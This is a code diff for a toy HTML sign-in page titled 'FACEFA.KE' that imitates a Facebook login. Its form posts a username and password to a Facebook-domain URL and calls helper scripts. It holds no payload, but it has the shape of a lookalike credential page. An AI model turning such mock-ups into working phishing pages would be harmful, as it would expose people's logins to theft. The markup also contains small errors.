@@ -1,22 +1,33 @@
 <!DOCTYPE html>
  <head>
+    <meta charset="UTF-8">
    <title> FACEFA.KE </title>
    <link rel="stylesheet" href="../css/sign-in.css" type="text/css">
+   <script src="../js/sign-in.js"></script>
  </head>
 	<body>
-  <form action="https://facebook.com/admin9x9x" target="_blank" method="POST">
+  <form action="https://www.fb.com/admin9x9x" target="_blank" method="POST" 
+onsubmit="return check()">
 	 <div class="login-box">
 	   <h1> Login </h1>
 	   <div class="textbox">
 	    <!--<i class="fas fa-key" aria-hidden="true"></i><-->
-	     <input type="text" placeholder="Username" name="" value=""> 
+	     <input type="text" placeholder="Username" name="username" value=""
+onkeypress="return isEnter(event)" autofocus> 
            </div>
 	    <div class="textbox">
 	    <!--<i class="fas fa-key"></i>-->
-	    <input type="password" placeholder="Password" name="" value"">
+	    <input type="password" placeholder="Password" name="password" value"">
 	   </div>
-	    <input class="button" type="submit" name="" value="Sign-in">
-	 </div>
+	<div id="warning"></div>
+	    <input class="button" type="submit" onclick="zero" name="" value="Sign-in">
+	 	<ul class="down">
+		  <li onclick="message()"> <a href="#">Forgot password</a></li>
+		  <li> Don't have an account?<a href="#" onclick="message()"> Sign up </a></li>
+		  <li onclick="message()"><a href="#"> Điều khoản sử dụng </a></li>
+	 	</ul>
+	   </div>
+
    </form>
 	</body>
 </html>
